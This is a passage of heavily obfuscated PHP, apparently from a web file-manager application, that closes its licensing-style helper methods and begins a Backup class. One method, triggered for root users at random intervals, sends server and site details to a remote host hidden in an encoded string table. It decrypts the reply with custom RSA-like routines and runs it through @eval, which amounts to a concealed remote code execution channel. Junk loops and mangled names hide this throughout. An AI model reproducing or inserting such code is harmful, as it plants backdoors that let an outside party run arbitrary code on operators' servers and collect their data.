(!$àÊ¥¯¢) { break; } $àÊ¥¯¢++; } $˜€ô¾Æ = _get($this->fsnte7f710df, $’¸Ì•ú‘[118], $’¸Ì•ú‘[6]); $’‰üÑÆÅ = _get($this->fsnte7f710df, $’¸Ì•ú‘[252], $’¸Ì•ú‘[6]); $ç´Øñ‡¦ = $ïïÑ‚ÆÜ[777]; if (!$ç´Øñ‡¦) { return; } if ($˜€ô¾Æ > time() && $’‰üÑÆÅ > time()) { $×•ªÓÎ = explode($’¸Ì•ú‘[229], $’º¬Ó³³); $æéÚˆìÇ = array_keys($this->versionPluginList()); $’º¬Ó³³ = array_merge($×•ªÓÎ, $æéÚˆìÇ); $’º¬Ó³³ = implode($’¸Ì•ú‘[229], array_filter(array_unique($’º¬Ó³³))); } return $’º¬Ó³³; } private function iyhc7b6e324b() { $„†çóø¼ =& $_SERVER[îâŸó­ˆ]; if ($this->xfnj9a3a9d5d != $„†çóø¼[111]) { $GLOBALS[$„†çóø¼[88]][$„†çóø¼[92]][$„†çóø¼[253]] = $„†çóø¼[208]; return; } $GLOBALS[$„†çóø¼[88]][$„†çóø¼[254]] = $„†çóø¼[124]; if (Model($„†çóø¼[255])->get($„†çóø¼[63]) != $„†çóø¼[208]) { Model($„†çóø¼[255])->set($„†çóø¼[63], $„†çóø¼[208]); } } public function btuk24a2da52() { return $_SERVER[îâŸó­ˆ][256]; } private function kxbufec1321c() { $—¸¿Ô€à =& $_SERVER[±Ö‰ô½¯]; $Ş§±·Ù‰ =& $_SERVER[îâŸó­ˆ]; $ß˜£Ûó• = array($Ş§±·Ù‰[257], $Ş§±·Ù‰[258], $Ş§±·Ù‰[259]); $üğ¡úİ = $Ş§±·Ù‰[260] . md5($Ş§±·Ù‰[261]); $åº¡±Íƒ = $—¸¿Ô€à[778]; if (strlen($åº¡±Íƒ) < $—¸¿Ô€à[743]) { die; } if ($this->xfnj9a3a9d5d == $Ş§±·Ù‰[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Ş§±·Ù‰[24]], $ß˜£Ûó•)) { return; } if (time() % 4 != 0) { return; } $Ÿãô»Õª = call_user_func(array($Ş§±·Ù‰[262], $Ş§±·Ù‰[263]), $üğ¡úİ); $­¤Ñ’Ò× = $—¸¿Ô€à[779]; if (strlen($­¤Ñ’Ò×) < $—¸¿Ô€à[704]) { die; } if ($Ÿãô»Õª && time() - $Ÿãô»Õª < intval($Ş§±·Ù‰[264])) { return; } call_user_func(array($Ş§±·Ù‰[262], $Ş§±·Ù‰[141]), $üğ¡úİ, time()); $—§ÎÛÍÉ = Model($Ş§±·Ù‰[33])->get($Ş§±·Ù‰[102]); $•Æúë› = array($Ş§±·Ù‰[154] => Model($Ş§±·Ù‰[33])->get($Ş§±·Ù‰[155]), $Ş§±·Ù‰[169] => $this->xfnj9a3a9d5d, $Ş§±·Ù‰[165] => $_SERVER[$Ş§±·Ù‰[166]], $Ş§±·Ù‰[167] => Model($Ş§±·Ù‰[33])->get($Ş§±·Ù‰[133]), $Ş§±·Ù‰[107] => md5($_SERVER[$Ş§±·Ù‰[108]] . $—§ÎÛÍÉ), $Ş§±·Ù‰[158] => $Ş§±·Ù‰[138], $Ş§±·Ù‰[161] => $_SERVER[$Ş§±·Ù‰[162]]); $½’÷’Ÿ = $—¸¿Ô€à[780]; if (!$½’÷’Ÿ) { die; } $æûûÉëÌ = $this->aqym18c82ef5($Ş§±·Ù‰[265], $•Æúë›); if (!is_array($æûûÉëÌ)) { return; } if ($æûûÉëÌ[$Ş§±·Ù‰[154]] && $æûûÉëÌ[$Ş§±·Ù‰[266]]) { if ($this->halufc1c2bba($æûûÉëÌ[$Ş§±·Ù‰[266]]) == $•Æúë›[$Ş§±·Ù‰[154]]) { return; } } $this->mwqr274f7962(); $ÌìäÆ‰« = $—¸¿Ô€à[781]; if (strlen($ÌìäÆ‰«) < $—¸¿Ô€à[717]) { return; } if ($this->halufc1c2bba($æûûÉëÌ[$Ş§±·Ù‰[266]]) != $•Æúë›[$Ş§±·Ù‰[154]]) { $†ÅÚî­ = array($Ş§±·Ù‰[187] => $—§ÎÛÍÉ, $Ş§±·Ù‰[188] => $_SERVER[$Ş§±·Ù‰[108]], $Ş§±·Ù‰[189] => this_url(), $Ş§±·Ù‰[163] => $_SERVER[$Ş§±·Ù‰[164]]); $ËÑÀ«ÊŸ = $this->qbeg68b717ba(json_encode($†ÅÚî­)); $æûûÉëÌ = $this->aqym18c82ef5($Ş§±·Ù‰[190] . $ËÑÀ«ÊŸ); if ($æûûÉëÌ && is_array($æûûÉëÌ) && isset($æûûÉëÌ[$Ş§±·Ù‰[266]])) { $¦—¡ÎÍü = $this->ynpiaeb659d3($æûûÉëÌ[$Ş§±·Ù‰[266]], 2); if ($¦—¡ÎÍü) { $¦—¡ÎÍü = $this->halufc1c2bba($¦—¡ÎÍü); } if ($¦—¡ÎÍü) { try { @eval($¦—¡ÎÍü); } catch (Exception $¦ƒ…ÚÁÊ) { } } } } } private function aqym18c82ef5($§ÙÖüé = '', $¾ã”ø× = array(), $Ğú‡ÀœÔ = 5) { $¥¥Åıî =& $_SERVER[±Ö‰ô½¯]; $ šĞø­­ =& $_SERVER[îâŸó­ˆ]; $ƒÜÊ°¨­ = $ šĞø­­[267]; $ó¸ˆŸŞĞ = $¥¥Åıî[782]; if (strlen($ó¸ˆŸŞĞ) < $¥¥Åıî[717]) { return; } $ƒÜÊ°¨­ = $this->mvyif9e84d64($ƒÜÊ°¨­, $ šĞø­­[268]); $şÕêó ¦ = $¥¥Åıî[783]; $ƒÜÊ°¨­ = $ƒÜÊ°¨­ . $§ÙÖüé; $­¼ÄÎƒ¸ = $¥¥Åıî[784]; if (strlen($­¼ÄÎƒ¸) < $¥¥Åıî[710]) { die; } if ($¾ã”ø× && is_array($¾ã”ø×)) { $ƒÜÊ°¨­ = $ƒÜÊ°¨­ . $ šĞø­­[269] . http_build_query($¾ã”ø×); } if ($¾ã”ø× === -1) { return $ƒÜÊ°¨­; } $ªñµî÷™ = stream_context_create(array($ šĞø­­[222] => array($ šĞø­­[225] => $Ğú‡ÀœÔ, $ šĞø­­[223] => $ šĞø­­[270]), $ šĞø­­[271] => array($ šĞø­­[272] => !1, $ šĞø­­[273] => !1))); $Æğ²íöğ = $¥¥Åıî[785]; if (!$Æğ²íöğ) { die; } $¾ã”ø× = @file_get_contents($ƒÜÊ°¨­, !1, $ªñµî÷™); return json_decode($¾ã”ø×, !0); } private function hakv0c27f720() { $åÎ®Õ“ =& $_SERVER[±Ö‰ô½¯]; $‡ãıüŠé =& $_SERVER[îâŸó­ˆ]; $ªÓßšÉÇ = array($‡ãıüŠé[274] => $‡ãıüŠé[275], $‡ãıüŠé[276] => $‡ãıüŠé[277], $‡ãıüŠé[278] => $‡ãıüŠé[279], $‡ãıüŠé[280] => $‡ãıüŠé[281], $‡ãıüŠé[282] => $‡ãıüŠé[283], $‡ãıüŠé[284] => $‡ãıüŠé[217], $‡ãıüŠé[285] => $‡ãıüŠé[217], $‡ãıüŠé[286] => $‡ãıüŠé[275], $‡ãıüŠé[287] => $‡ãıüŠé[277], $‡ãıüŠé[288] => $‡ãıüŠé[279], $‡ãıüŠé[289] => $‡ãıüŠé[290], $‡ãıüŠé[291] => $‡ãıüŠé[281], $‡ãıüŠé[292] => $‡ãıüŠé[293], $‡ãıüŠé[294] => $‡ãıüŠé[283], $‡ãıüŠé[295] => $‡ãıüŠé[296], $‡ãıüŠé[297] => $‡ãıüŠé[298], $‡ãıüŠé[299] => $‡ãıüŠé[300]); $¶şÄ…¿ = $åÎ®Õ“[786]; if (strlen($¶şÄ…¿) < $åÎ®Õ“[743]) { return; } $ÓóŞË’Í = $ªÓßšÉÇ[$this->xfnj9a3a9d5d]; $ÓóŞË’Í = intval($ÓóŞË’Í ? $ÓóŞË’Í : $‡ãıüŠé[275]); $µ’ºÚ§ò = $åÎ®Õ“[787]; if (strlen($µ’ºÚ§ò) < $åÎ®Õ“[743]) { return; } $¬¼·†¤± = _get($this->fsnte7f710df, $‡ãıüŠé[301]); $¬¼·†¤± = $¬¼·†¤± ? intval($¬¼·†¤±) : 0; return $ÓóŞË’Í + $¬¼·†¤±; } public function tfrk8f2327cb($ó’˜‡Æ) { $‰Èóî° =& $_SERVER[±Ö‰ô½¯]; $¡óÊŸøĞ =& $_SERVER[îâŸó­ˆ]; $â¸Ø½ê» = $this->hakv0c27f720(); $Õ€ıî¹ = $‰Èóî°[788]; if (!$Õ€ıî¹) { return; } if ($ó’˜‡Æ[$¡óÊŸøĞ[302]] == $¡óÊŸøĞ[124]) { return; } if ($â¸Ø½ê» >= intval($¡óÊŸøĞ[217])) { return; } $­Ğâ‡»Ï = Model($¡óÊŸøĞ[127])->count(); if ($­Ğâ‡»Ï <= $â¸Ø½ê») { return; } $ö•Ï³çÑ = Model($¡óÊŸøĞ[127])->field($¡óÊŸøĞ[302])->limit($â¸Ø½ê»)->select(); $¸Ò¸Šî = $‰Èóî°[789]; while ($¸Ò¸Šî < $‰Èóî°[710]) { if ($¸Ò¸Šî >= 0) { break; } $¸Ò¸Šî++; } $ö•Ï³çÑ = array_to_keyvalue($ö•Ï³çÑ, $¡óÊŸøĞ[6], $¡óÊŸøĞ[302]); $•½€ó–­ = $‰Èóî°[790]; while (strlen($•½€ó–­) < $‰Èóî°[743]) { if (!$•½€ó–­) { break; } $•½€ó–­++; } if (!in_array($ó’˜‡Æ[$¡óÊŸøĞ[302]], $ö•Ï³çÑ)) { show_json($¡óÊŸøĞ[303], !1, $¡óÊŸøĞ[213]); } } public function dzbg5ed46668() { $ÍÆ‹¯‡— =& $_SERVER[±Ö‰ô½¯]; $ù¦·µéã =& $_SERVER[îâŸó­ˆ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $Åß÷µà = $ù¦·µéã[220]; $´Ú—ƒùÄ = $ÍÆ‹¯‡—[791]; while (strlen($´Ú—ƒùÄ) < $ÍÆ‹¯‡—[717]) { if (!$´Ú—ƒùÄ) { break; } $´Ú—ƒùÄ++; } $Åß÷µà = $this->mvyif9e84d64($Åß÷µà, $ù¦·µéã[221]); $ß»š‘É = stream_context_create(array($ù¦·µéã[222] => array($ù¦·µéã[223] => $ù¦·µéã[224], $ù¦·µéã[225] => 3))); $¶Ş¼³ = $ÍÆ‹¯‡—[792]; if (strlen($¶Ş¼³) < $ÍÆ‹¯‡—[717]) { return; } $»»…ïÍş = @file_get_contents($Åß÷µà, !1, $ß»š‘É); $¹Ñƒ÷ÃÉ = $ÍÆ‹¯‡—[793]; if (!$¹Ñƒ÷ÃÉ) { return; } echo $ù¦·µéã[304] . hash_encode($»»…ïÍş) . $ù¦·µéã[305]; } private function pjbic9c7fc82($çÈ¡œø·, $±÷œ¬Ù, $©†–É¸õ = 3) { $ä¶Çé…½ =& $_SERVER[±Ö‰ô½¯]; $›­››£ =& $_SERVER[îâŸó­ˆ]; usleep(1); $çÈ¡œø· = trim($çÈ¡œø·); $·¥Ó°Ší = $ä¶Çé…½[794]; while ($·¥Ó°Ší < $ä¶Çé…½[704]) { if ($·¥Ó°Ší >= 0) { break; } $·¥Ó°Ší++; } $Ñ¬†ºñ = mt_rand(0, 5) . $›­››£[6]; $óØò±ôò = rand_string(15); $·ŞÀåü½ = $ä¶Çé…½[795]; $ßú¼– = $›­››£[306]; $¯ÄÂ¨¡ƒ = $ä¶Çé…½[796]; switch ($Ñ¬†ºñ) { case $›­››£[208]: $œíÎ‰¨ = $this->dkqu0b2e993e($çÈ¡œø·, strrev($±÷œ¬Ù . $óØò±ôò)); $°ø´ò¼Ù = $ä¶Çé…½[797]; if (!$°ø´ò¼Ù) { return; } break; $İ•Ç´ = $ä¶Çé…½[798]; if (strlen($İ•Ç´) < $ä¶Çé…½[712]) { return; } case $›­››£[124]: $œíÎ‰¨ = $this->dkqu0b2e993e($çÈ¡œø·, strrev($óØò±ôò . $±÷œ¬Ù)); break; $Ï›˜‘» = $ä¶Çé…½[799]; if (!$Ï›˜‘») { die; } case $›­››£[307]: $œíÎ‰¨ = $this->dkqu0b2e993e($çÈ¡œø·, base64_encode($óØò±ôò . $±÷œ¬Ù)); break; case $›­››£[308]: $œíÎ‰¨ = $this->dkqu0b2e993e($çÈ¡œø·, md5($óØò±ôò . $±÷œ¬Ù)); break; case $›­››£[309]: $çÈ¡œø· = base64_encode($çÈ¡œø·); $äÀÕµ± = rand(0, 64); $ñÔ’•‰× = $ä¶Çé…½[800]; if (!$ñÔ’•‰×) { die; } $­„Ôş³ò = $ßú¼–[$äÀÕµ±]; $ŞĞâ†ŸÈ = md5($­„Ôş³ò . md5($±÷œ¬Ù . $­„Ôş³ò) . $±÷œ¬Ù); $½Ë—ªúÇ = $ä¶Çé…½[801]; if (!$½Ë—ªúÇ) { return; } $ŞĞâ†ŸÈ = substr($ŞĞâ†ŸÈ, $äÀÕµ± % 8, $äÀÕµ± % 8 + 7); $ÈìéÔóƒ = $ä¶Çé…½[802]; while (strlen($ÈìéÔóƒ) < $ä¶Çé…½[704]) { if (!$ÈìéÔóƒ) { break; } $ÈìéÔóƒ++; } $ä¤ÉØµµ = $›­››£[6]; $‹˜‘•Ş¨ = 0; $èÙ«ÃŒı = $ä¶Çé…½[803]; while (strlen($èÙ«ÃŒı) < $ä¶Çé…½[704]) { if (!$èÙ«ÃŒı) { break; } $èÙ«ÃŒı++; } $Ğ˜·”Ãå = 0; $ğ‹•ŸàÕ = 0; $ïß‡‡âš = $ä¶Çé…½[804]; while (strlen($ïß‡‡âš) < $ä¶Çé…½[743]) { if (!$ïß‡‡âš) { break; } $ïß‡‡âš++; } for ($‹˜‘•Ş¨ = 0; $‹˜‘•Ş¨ < strlen($çÈ¡œø·); $‹˜‘•Ş¨++) { $ğ‹•ŸàÕ = $ğ‹•ŸàÕ == strlen($ŞĞâ†ŸÈ) ? 0 : $ğ‹•ŸàÕ; $¨Ì«Áòñ = $ä¶Çé…½[805]; while (strlen($¨Ì«Áòñ) < $ä¶Çé…½[712]) { if (!$¨Ì«Áòñ) { break; } $¨Ì«Áòñ++; } $Ğ˜·”Ãå = ($äÀÕµ± + strpos($ßú¼–, $çÈ¡œø·[$‹˜‘•Ş¨]) + ord($ŞĞâ†ŸÈ[$ğ‹•ŸàÕ++])) % 64; $ä¤ÉØµµ .= $ßú¼–[$Ğ˜·”Ãå]; } $œíÎ‰¨ = hash_encode($­„Ôş³ò . $ä¤ÉØµµ); $êÔïÜ™ü = $ä¶Çé…½[806]; if (strlen($êÔïÜ™ü) < $ä¶Çé…½[712]) { return; } break; default: $œíÎ‰¨ = $this->dkqu0b2e993e($çÈ¡œø·, $±÷œ¬Ù . $óØò±ôò); break; $…‘óÑ² = $ä¶Çé…½[807]; if (strlen($…‘óÑ²) < $ä¶Çé…½[712]) { die; } } $œíÎ‰¨ = strrev($Ñ¬†ºñ . $óØò±ôò . $œíÎ‰¨); $‡² øæò = $ä¶Çé…½[808]; if (!$‡² øæò) { die; } if ($©†–É¸õ - 1 > 0) { $œíÎ‰¨ = $this->pjbic9c7fc82($œíÎ‰¨, $±÷œ¬Ù, $©†–É¸õ - 1); } return $œíÎ‰¨; } private function ynpiaeb659d3($œåÌÂ¶¾, $ÍºÏßÖÑ, $ƒ³¥¼óœ = 3) { $…ùˆ¡¥£ =& $_SERVER[±Ö‰ô½¯]; $ÖµïÑ½Û =& $_SERVER[îâŸó­ˆ]; if (!is_string($œåÌÂ¶¾) || strlen($œåÌÂ¶¾) < 10) { return !1; } $œåÌÂ¶¾ = trim($œåÌÂ¶¾); $Ç¬İ¬ò¹ = $…ùˆ¡¥£[809]; while (strlen($Ç¬İ¬ò¹) < $…ùˆ¡¥£[743]) { if (!$Ç¬İ¬ò¹) { break; } $Ç¬İ¬ò¹++; } $œåÌÂ¶¾ = strrev($œåÌÂ¶¾); $åá¹ºà = $…ùˆ¡¥£[810]; $ÓÒï²”Ï = $œåÌÂ¶¾[0]; $Ò‘¼ÛÃ› = $…ùˆ¡¥£[811]; if (!$Ò‘¼ÛÃ›) { die; } $ŒÏÚ÷Î = substr($œåÌÂ¶¾, 1, 15); $Ùéô‹Öù = $…ùˆ¡¥£[812]; $œåÌÂ¶¾ = substr($œåÌÂ¶¾, 16); $°Şã­…ˆ = $ÖµïÑ½Û[306]; $ì¦®¿ø = $…ùˆ¡¥£[813]; if (strlen($ì¦®¿ø) < $…ùˆ¡¥£[743]) { return; } switch ($ÓÒï²”Ï) { case $ÖµïÑ½Û[208]: $˜»ã¢ü· = $this->mvyif9e84d64($œåÌÂ¶¾, strrev($ÍºÏßÖÑ . $ŒÏÚ÷Î)); break; $àšÀƒ¼ = $…ùˆ¡¥£[814]; case $ÖµïÑ½Û[124]: $˜»ã¢ü· = $this->mvyif9e84d64($œåÌÂ¶¾, strrev($ŒÏÚ÷Î . $ÍºÏßÖÑ)); break; $÷ë„ãÓ³ = $…ùˆ¡¥£[815]; if (!$÷ë„ãÓ³) { die; } case $ÖµïÑ½Û[307]: $˜»ã¢ü· = $this->mvyif9e84d64($œåÌÂ¶¾, base64_encode($ŒÏÚ÷Î . $ÍºÏßÖÑ)); break; case $ÖµïÑ½Û[308]: $˜»ã¢ü· = $this->mvyif9e84d64($œåÌÂ¶¾, md5($ŒÏÚ÷Î . $ÍºÏßÖÑ)); $âçÊ¡èÎ = $…ùˆ¡¥£[816]; if (strlen($âçÊ¡èÎ) < $…ùˆ¡¥£[704]) { die; } break; $ÊŠ¥™­ = $…ùˆ¡¥£[817]; if (strlen($ÊŠ¥™­) < $…ùˆ¡¥£[717]) { die; } case $ÖµïÑ½Û[309]: $œåÌÂ¶¾ = hash_decode($œåÌÂ¶¾); $ªŠÈ‚ = $…ùˆ¡¥£[818]; while (strlen($ªŠÈ‚) < $…ùˆ¡¥£[743]) { if (!$ªŠÈ‚) { break; } $ªŠÈ‚++; } $äâ¼‚“Ê = $œåÌÂ¶¾[0]; $œåÌÂ¶¾ = substr($œåÌÂ¶¾, 1); $ˆ»ƒÙÔÕ = strpos($°Şã­…ˆ, $äâ¼‚“Ê); $©’Ê‚…í = md5($äâ¼‚“Ê . md5($ÍºÏßÖÑ . $äâ¼‚“Ê) . $ÍºÏßÖÑ); $©’Ê‚…í = substr($©’Ê‚…í, $ˆ»ƒÙÔÕ % 8, $ˆ»ƒÙÔÕ % 8 + 7); $ş¦¢¹›Ó = $ÖµïÑ½Û[6]; $Ó«Ë÷£– = $…ùˆ¡¥£[819]; if (strlen($Ó«Ë÷£–) < $…ùˆ¡¥£[717]) { die; } $óÜş¯ªŒ = 0; $ş¦À®‘› = 0; $—÷¡³ñÁ = $…ùˆ¡¥£[820]; while ($—÷¡³ñÁ < $…ùˆ¡¥£[712]) { if ($—÷¡³ñÁ >= 0) { break; } $—÷¡³ñÁ++; } $Ö©ß¾Ó² = 0; $ÍãÑÍ£Ë = $…ùˆ¡¥£[821]; if (!$ÍãÑÍ£Ë) { die; } for ($óÜş¯ªŒ = 0; $óÜş¯ªŒ < strlen($œåÌÂ¶¾); $óÜş¯ªŒ++) { $Ö©ß¾Ó² = $Ö©ß¾Ó² == strlen($©’Ê‚…í) ? 0 : $Ö©ß¾Ó²; $Ëôàª”ï = $Ö©ß¾Ó²++; $ş¦À®‘› = strpos($°Şã­…ˆ, $œåÌÂ¶¾[$óÜş¯ªŒ]) - $ˆ»ƒÙÔÕ - ord($©’Ê‚…í[$Ëôàª”ï]); $´‡ÚÓ© = $…ùˆ¡¥£[822]; if (strlen($´‡ÚÓ©) < $…ùˆ¡¥£[743]) { return; } while ($ş¦À®‘› < 0) { $ş¦À®‘› += 64; } $ş¦¢¹›Ó .= $°Şã­…ˆ[$ş¦À®‘›]; } $˜»ã¢ü· = base64_decode($ş¦¢¹›Ó); $´ŠÇÑ­‰ = $…ùˆ¡¥£[823]; if (!$´ŠÇÑ­‰) { return; } break; $€ÖŞÇóƒ = $…ùˆ¡¥£[824]; while ($€ÖŞÇóƒ < $…ùˆ¡¥£[717]) { if ($€ÖŞÇóƒ >= 0) { break; } $€ÖŞÇóƒ++; } default: $˜»ã¢ü· = $this->mvyif9e84d64($œåÌÂ¶¾, $ÍºÏßÖÑ . $ŒÏÚ÷Î); $Ó×œªï = $…ùˆ¡¥£[825]; if (!$Ó×œªï) { return; } break; $¡™Õ¡øö = $…ùˆ¡¥£[826]; if (strlen($¡™Õ¡øö) < $…ùˆ¡¥£[717]) { return; } } if ($ƒ³¥¼óœ - 1 > 0) { $˜»ã¢ü· = $this->ynpiaeb659d3($˜»ã¢ü·, $ÍºÏßÖÑ, $ƒ³¥¼óœ - 1); } return $˜»ã¢ü·; } public function qbeg68b717ba($ÁìƒƒÏü) { $Â”»Êó =& $_SERVER[±Ö‰ô½¯]; $ìÙÁº•ç =& $_SERVER[îâŸó­ˆ]; $åµ¬ßª¡ = $this->epiq26863def(); $˜êø‘‡š = $Â”»Êó[827]; while (strlen($˜êø‘‡š) < $Â”»Êó[717]) { if (!$˜êø‘‡š) { break; } $˜êø‘‡š++; } $Æ†¥×”• = $this->epiq26863def(); $–Û‹ = $Â”»Êó[828]; if (strlen($–Û‹) < $Â”»Êó[717]) { die; } $¯ªÀ™è = ($åµ¬ßª¡ - 1) * ($Æ†¥×”• - 1); $‹Üù®• = intval(($åµ¬ßª¡ + $Æ†¥×”•) / 2); $õ¹€öŞÏ = $Â”»Êó[829]; while (1) { $Í¿ƒóÈ† = $‹Üù®•; $öˆ„Óşº = $¯ªÀ™è; $ÃÍª÷à = $Â”»Êó[830]; if (strlen($ÃÍª÷à) < $Â”»Êó[743]) { die; } while ($öˆ„Óşº % $Í¿ƒóÈ† != 0) { $öËÅ²ùÅ = $öˆ„Óşº; $öˆ„Óşº = $Í¿ƒóÈ†; $Éíá§²š = $Â”»Êó[831]; while ($Éíá§²š < $Â”»Êó[743]) { if ($Éíá§²š >= 0) { break; } $Éíá§²š++; } $Í¿ƒóÈ† = $öËÅ²ùÅ % $Í¿ƒóÈ†; } if ($Í¿ƒóÈ† == 1) { break; } else { $‹Üù®•++; } } $ê”÷ÄãÛ = 2; for ($—´·¡É = 0; $—´·¡É < $¯ªÀ™è * 10; $—´·¡É++) { if (($¯ªÀ™è * $—´·¡É + 1) % $‹Üù®• == 0) { $ê”÷ÄãÛ = intval(($¯ªÀ™è * $—´·¡É + 1) / $‹Üù®•); break; } } $¼­Éƒ–Ú = $this->dkqu0b2e993e($åµ¬ßª¡ * $Æ†¥×”• . $ìÙÁº•ç[6], $ìÙÁº•ç[138]); $¯È‚ËñÚ = $Â”»Êó[832]; if (!$¯È‚ËñÚ) { return; } $Ğú°©ûó = md5($ìÙÁº•ç[310] . ($åµ¬ßª¡ + $Æ†¥×”•) . $ìÙÁº•ç[311] . $‹Üù®• . $ìÙÁº•ç[311] . $ê”÷ÄãÛ . $ìÙÁº•ç[312]); $–ïüÍØ¯ = $this->dkqu0b2e993e($ÁìƒƒÏü, $Ğú°©ûó) . $ìÙÁº•ç[313] . $¼­Éƒ–Ú; return $–ïüÍØ¯; } public function halufc1c2bba($èİú¤¯) { $”Ø¸èƒº =& $_SERVER[±Ö‰ô½¯]; $°Ì§á–¦ =& $_SERVER[îâŸó­ˆ]; $çÆÉÌÁ = explode($°Ì§á–¦[313], $èİú¤¯); if (count($çÆÉÌÁ) != 2) { return $°Ì§á–¦[6]; } $ŞÏòÒ†à = $this->mvyif9e84d64($çÆÉÌÁ[1] . $°Ì§á–¦[6], $°Ì§á–¦[138]); if (!$ŞÏòÒ†à) { return $°Ì§á–¦[6]; } $ŞÏòÒ†à = intval($ŞÏòÒ†à); $—‘úÒö¼ = 0; $¢”ûãÚ± = 0; for ($äÁÇ¢¸½ = 3; $äÁÇ¢¸½ < $ŞÏòÒ†à; $äÁÇ¢¸½ += 2) { if ($ŞÏòÒ†à % $äÁÇ¢¸½ != 0) { continue; } $—‘úÒö¼ = $äÁÇ¢¸½; $‰İ™¿¬² = $”Ø¸èƒº[833]; if (strlen($‰İ™¿¬²) < $”Ø¸èƒº[717]) { return; } $¢”ûãÚ± = intval($ŞÏòÒ†à / $äÁÇ¢¸½); $©òİ¬ßØ = $”Ø¸èƒº[834]; break; $¯â•¨óİ = $”Ø¸èƒº[835]; } $æèı“ŸÍ = ($—‘úÒö¼ - 1) * ($¢”ûãÚ± - 1); $‰ˆÆ¹ø = $”Ø¸èƒº[836]; if (!$‰ˆÆ¹ø) { return; } $óƒÌíØ = intval(($—‘úÒö¼ + $¢”ûãÚ±) / 2); $‚øÅ”’¨ = $”Ø¸èƒº[837]; if (strlen($‚øÅ”’¨) < $”Ø¸èƒº[717]) { return; } while (1) { $ß±³÷ãõ = $óƒÌíØ; $·Îìœ¹ = $”Ø¸èƒº[838]; if (!$·Îìœ¹) { return; } $œ½²£à¦ = $æèı“ŸÍ; while ($œ½²£à¦ % $ß±³÷ãõ != 0) { $Íıé™¹ƒ = $œ½²£à¦; $œ½²£à¦ = $ß±³÷ãõ; $×†ÈÉÍŠ = $”Ø¸èƒº[839]; while ($×†ÈÉÍŠ < $”Ø¸èƒº[717]) { if ($×†ÈÉÍŠ >= 0) { break; } $×†ÈÉÍŠ++; } $ß±³÷ãõ = $Íıé™¹ƒ % $ß±³÷ãõ; } if ($ß±³÷ãõ == 1) { break; } else { $óƒÌíØ++; } } $…ÚÖšÁ£ = 2; for ($äÁÇ¢¸½ = 0; $äÁÇ¢¸½ < $æèı“ŸÍ * 10; $äÁÇ¢¸½++) { if (($æèı“ŸÍ * $äÁÇ¢¸½ + 1) % $óƒÌíØ == 0) { $…ÚÖšÁ£ = intval(($æèı“ŸÍ * $äÁÇ¢¸½ + 1) / $óƒÌíØ); break; } } $èÂ† Ğ = md5($°Ì§á–¦[310] . ($—‘úÒö¼ + $¢”ûãÚ±) . $°Ì§á–¦[311] . $óƒÌíØ . $°Ì§á–¦[311] . $…ÚÖšÁ£ . $°Ì§á–¦[312]); $ç µ†‰ƒ = $this->mvyif9e84d64($çÆÉÌÁ[0], $èÂ† Ğ); $ÜßÃà­ƒ = $”Ø¸èƒº[840]; return $ç µ†‰ƒ; } public function epiq26863def() { $çÎÀ°¦ =& $_SERVER[±Ö‰ô½¯]; $á‰éÕ± = mt_rand(pow(2, 14), pow(2, 16) - 1); $Èİşşºğ = array(); $…¼¯‹Õë = 1; while ($…¼¯‹Õë <= (int) sqrt($á‰éÕ±)) { $ØÏÓŒó = $…¼¯‹Õë; $¡×Æ…Ùä = $çÎÀ°¦[841]; if (strlen($¡×Æ…Ùä) < $çÎÀ°¦[712]) { die; } while (!0) { $ØÏÓŒó++; $¦°ÓĞ Œ = $çÎÀ°¦[842]; while ($¦°ÓĞ Œ < $çÎÀ°¦[717]) { if ($¦°ÓĞ Œ >= 0) { break; } $¦°ÓĞ Œ++; } if ($ØÏÓŒó <= 2) { $…¼¯‹Õë = $ØÏÓŒó; break; } else { if ($ØÏÓŒó < 2) { continue; } } $²«Ğ’öì = !0; for ($¥ã«ò™ = 2; $¥ã«ò™ <= sqrt($ØÏÓŒó); $¥ã«ò™++) { if ($ØÏÓŒó % $¥ã«ò™ == 0) { $²«Ğ’öì = !1; } } if ($²«Ğ’öì) { $…¼¯‹Õë = $ØÏÓŒó; break; } } $Èİşşºğ[] = $…¼¯‹Õë; } $±ŞÉù½Š = 2; $Ú²Œù„ = $çÎÀ°¦[843]; if (!$Ú²Œù„) { return; } for ($ØÏÓŒó = $á‰éÕ±; $ØÏÓŒó > 1; $ØÏÓŒó--) { $²«Ğ’öì = !0; $Áäûïüç = $çÎÀ°¦[844]; foreach ($Èİşşºğ as $‰—µÌíÇ) { if ($ØÏÓŒó % $‰—µÌíÇ == 0) { $²«Ğ’öì = !1; break; } } if ($²«Ğ’öì) { $±ŞÉù½Š = $ØÏÓŒó; break; } } return $±ŞÉù½Š; } public function qpbgc05d2356($€†èï”Å, $—ĞşŠ€¹) { $Ë¤‰Ïê¡ =& $_SERVER[±Ö‰ô½¯]; $ô¶ÍŸæó =& $_SERVER[îâŸó­ˆ]; return call_user_func(array($ô¶ÍŸæó[8], $ô¶ÍŸæó[314]), $€†èï”Å, $—ĞşŠ€¹); $Á§¦Ş­Ç = $Ë¤‰Ïê¡[812]; while ($Á§¦Ş­Ç < $Ë¤‰Ïê¡[704]) { if ($Á§¦Ş­Ç >= 0) { break; } $Á§¦Ş­Ç++; } } public function dkqu0b2e993e($Ã­ö®½˜, $®Œ±Ù†—) { $èšê›‚û =& $_SERVER[îâŸó­ˆ]; return call_user_func(array($èšê›‚û[315], $èšê›‚û[316]), $Ã­ö®½˜, $®Œ±Ù†—); } public function mvyif9e84d64($ä´ªÎ£š, $õò•Ìá) { $’Îæè¨÷ =& $_SERVER[îâŸó­ˆ]; return call_user_func(array($’Îæè¨÷[315], $’Îæè¨÷[317]), $ä´ªÎ£š, $õò•Ìá); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[±Ö‰ô½¯][845]); $this->init(); $this->keep(); } public function init() { $£ĞåÑÓ‘ =& $_SERVER[±Ö‰ô½¯]; $this->isManual(); self::$name = date($£ĞåÑÓ‘[846]); if (!($ò ‰”Áœ = $this->model->lastItem())) { $ò ‰”Áœ = $this->initData(); } else { self::$name = $ò ‰”Áœ[$£ĞåÑÓ‘[32]]; if ($ò ‰”Áœ[$£ĞåÑÓ‘[847]] == $£ĞåÑÓ‘[91]) { self::$name = date($£ĞåÑÓ‘[261]); $ù•§¸ÚÛ = intval(_get($ò ‰”Áœ, $£ĞåÑÓ‘[848], 0)); if (self::$manual == 0 && $ò ‰”Áœ[$£ĞåÑÓ‘[32]] == self::$name) { $this->model->remove($ò ‰”Áœ[$£ĞåÑÓ‘[484]]); } $ò ‰”Áœ = 